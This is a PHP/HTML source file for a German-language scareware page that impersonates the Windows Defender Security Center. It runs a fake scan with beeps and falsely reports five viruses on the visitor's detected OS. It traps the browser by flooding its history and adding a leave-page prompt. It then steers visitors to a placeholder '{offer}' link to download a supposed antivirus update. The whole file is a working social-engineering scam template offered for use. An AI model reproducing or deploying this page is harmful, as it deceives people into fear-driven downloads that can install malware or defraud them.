<?php
$req =  $_SERVER['REQUEST_URI'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() {

    global $user_agent;

    $os_platform  = "PC";

    $os_array     = array(
        '/windows nt 10/i'      =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iPhone',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}


?>

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
    <title>Warnung</title>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <link href="style.css" type="text/css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,500,600,700&amp;amp;subset=cyrillic" rel="stylesheet"></head><span id="warning-container"><i data-reactroot=""></i></span><body><audio id="beep" src="beep.mp3" preload="auto"></audio>



<!--s_ex_pop-->
<script>
    history.replaceState(null, null, '<?=$req?>');
    for (t = 0; 10 > t; ++t) history.pushState(null, null, '<?=$req?>');
    var popit = true;
    window.onbeforeunload = function(index) {
        if(popit == true) {
            popit = false;
            return "Einen Moment! Ihre Antivirus-Software benötigt ein Update. Zur Entfernung aller erkannten Viren müssen Sie die Antivirus-Software aktualisieren.";
        }
    }
</script>
<!--f_ex_pop-->


<div id="av">
    <div id="header">
        <img class="ic0" id="ic0" src="h_ic0_10.gif">
        <div class="name">Windows Defender Sicherheitszentrum</div>
        <img class="ic1" id="ic1" src="h_ic1_10.gif">
        <img class="ic2" id="ic2" src="h_ic2_10.gif">
        <div class="btn_cl" id="btn_cl" onclick="showmess();"></div>
    </div>
    <div id="red">PC-Status: In Gefahr</div>
    <div id="tabs">
        <div class="tab1">Startseite</div>
        <div class="tab0">Update</div>
        <div class="tab0">Verlauf</div>
        <div class="tab0">Einstellungen</div>
    </div>
    <div id="content">
        <div class="bg"></div>
        <div id="block1">

            <div id="scan">
                <img class="ic" src="srh.gif">
                <div class="txt1">Ihr PC wird gescannt</div>
                <div class="txt2">Dies kann – in Abhängigkeit des ausgewählten Scanmodus – ein wenig dauern</div>
                <div class="prog_bg"></div>
                <div class="prog_fill" id="prog_fill"></div>
            </div>
            <div id="report" style="display: none;">
                <img src="monitor.gif" class="monitor">
                <div class="txt1">Scan vollständig<br><span style="color: #d00;">Ihr <?=getOS()?> ist mit 5 Viren infiziert!</span></div>
                <div class="txt2">Die Entfernung der Viren muss umgehend erfolgen, um weitere Schäden am System sowie den Verlust von Programmen, Fotos, Videos und weiteren Dateien zu verhindern. Private Daten und Bankdaten sind in Gefahr.</div>
            </div>
            <div id="tab">
                <div class="h1">Name</div>
                <div class="h2">Infizierte Datei</div>
                <div class="h3">Typ</div>
                <div class="h4">Gefahrenstufe</div>
                <div id="tab_l1" style="display: none;">
                    <img class="ic" src="v_ic.gif">
                    <div class="l_n"><b>Win32/Hoax.Renos.HX</b></div>
                    <div class="l_if">c:\Documents and Settings\All Users\...</div>
                    <div class="l_t">Virus</div>
                    <div class="l_tl">Mittel</div>
                </div>
                <div id="tab_l2" style="display: none;">
                    <img class="ic" src="v_ic.gif">
                    <div class="l_n"><b>Trojan IRC/Backdor.SdBot4.FRV</b></div>
                    <div class="l_if">c:\Documents and Settings\All Users\...</div>
                    <div class="l_t">Virus</div>
                    <div class="l_tl">Mittel</div>
                </div>
                <div id="tab_l3" style="display: none;">
                    <img class="ic" src="v_ic.gif">
                    <div class="l_n"><b>Adware.Win32.Look2me.ab</b></div>
                    <div class="l_if">c:\Program Files\CommonFiles\Syste...</div>
                    <div class="l_t">Virus</div>
                    <div class="l_tl">Kritisch</div>
                </div>
                <div id="tab_l4" style="display: none;">
                    <img class="ic" src="v_ic.gif">
                    <div class="l_n"><b>Trojan.Qoologic - Key Logger</b></div>
                    <div class="l_if">c:\Program Files\Windows NT\Access...</div>
                    <div class="l_t">Virus</div>
                    <div class="l_tl">Hoch</div>
                </div>
                <div id="tab_l5" style="display: none;">
                    <img class="ic" src="v_ic.gif">
                    <div class="l_n"><b>Trojan.Fakealert.356</b></div>
                    <div class="l_if">c:\Windows\System32\Microsoft\Prot...</div>
                    <div class="l_t">Virus</div>
                    <div class="l_tl">Mittel</div>
                </div>
            </div>
        </div>
        <div id="block2" style="display: none;">
            <img src="warning.png" class="ic">
            <div class="txt"><b>Handlungsbedarf!</b> Ihre Antivirus-Software benötigt ein Update. Zur Entfernung aller erkannten Viren müssen Sie die Antivirus-Software aktualisieren. Klicken Sie auf "<b>Weiter</b>" und auf der folgenden Seite auf "<b>Download</b>" um die neueste Version der Antivirus-Software herunterzuladen und zu installieren.</div>
            <a href="{offer}" onclick="popit = false;"><button class="btn">Weiter...</button></a>
        </div>
    </div>
</div>

<div id="mess" style="display: none;">
    <img class="ic1" id="ic3" src="h_ic2_10.gif">
    <img class="ic2" src="w_ic.gif">
    <div class="txt">
        HANDLUNGSBEDARF!<br><br>
        Ihre Antivirus-Software benötigt ein Update.<br><br>
        Zur Entfernung aller erkannten Viren müssen Sie die Antivirus-Software aktualisieren.<br><br>
        Klicken Sie auf „Weiter“ und auf der folgenden Seite auf „Download“, um die neueste Version der Antivirus-Software herunterzuladen und zu installieren.
    </div>
    <div class="bg"></div>
    <a href="{offer}" onclick="popit = false;"><button class="btn">Weiter...</button></a>
</div>

<script type="text/javascript">
    var agent = navigator.userAgent.toLowerCase();
    if (agent.indexOf("windows nt 6.1") > -1) {
        document.getElementById("av").style.borderTopLeftRadius = "4px";
        document.getElementById("av").style.borderTopRightRadius = "4px";
        document.getElementById("header").style.backgroundColor = "#acc4e5";
        document.getElementById("header").style.borderTopLeftRadius = "4px";
        document.getElementById("header").style.borderTopRightRadius = "4px";
        document.getElementById("ic0").src= "h_ic0_7.gif";
        document.getElementById("ic1").src= "h_ic1_7.gif";
        document.getElementById("ic2").src= "h_ic2_7.gif";
        document.getElementById("ic1").style.right = "9px";
        document.getElementById("ic1").style.top = "6px";
        document.getElementById("ic2").style.right = "44px";
        document.getElementById("ic2").style.top = "6px";
        document.getElementById("ic3").src= "h_ic3_7.gif";
        document.getElementById("ic3").style.right = "9px";
        document.getElementById("ic3").style.top = "6px";
    }
</script>

<script type="text/javascript">


    setTimeout(function() {
        document.getElementById("prog_fill").style.width = "615px";
    }, 2000);
    setTimeout(function() {
        document.getElementById("tab_l1").style.display = "block";
        document.getElementById("red").innerHTML = "PC-Status: In Gefahr";
        document.getElementById("red").style.backgroundColor = "#d00000";
        document.getElementById('beep').play();
    }, 3000);
    setTimeout(function() {
        document.getElementById("tab_l2").style.display = "block";
        document.getElementById('beep').play();
    }, 4000);
    setTimeout(function() {
        document.getElementById("tab_l3").style.display = "block";
        document.getElementById('beep').play();
    }, 4500);
    setTimeout(function() {
        document.getElementById("tab_l4").style.display = "block";
        document.getElementById('beep').play();
    }, 5500);
    setTimeout(function() {
        document.getElementById("tab_l5").style.display = "block";
        document.getElementById('beep').play();
    }, 7000);
    setTimeout(function() {
        document.getElementById("scan").style.display = "none";
        document.getElementById("report").style.display = "block";
        document.getElementById("ic1").style.opacity = "1";
        document.getElementById("ic2").style.opacity = "1";
        document.getElementById("btn_cl").style.zIndex = "1";
    }, 10000);
    setTimeout(function() {
        document.getElementById("block2").style.display = "block";
    }, 11000);

    function showmess() {
        document.getElementById("mess").style.display = "block";
    }
</script>


</body></html>

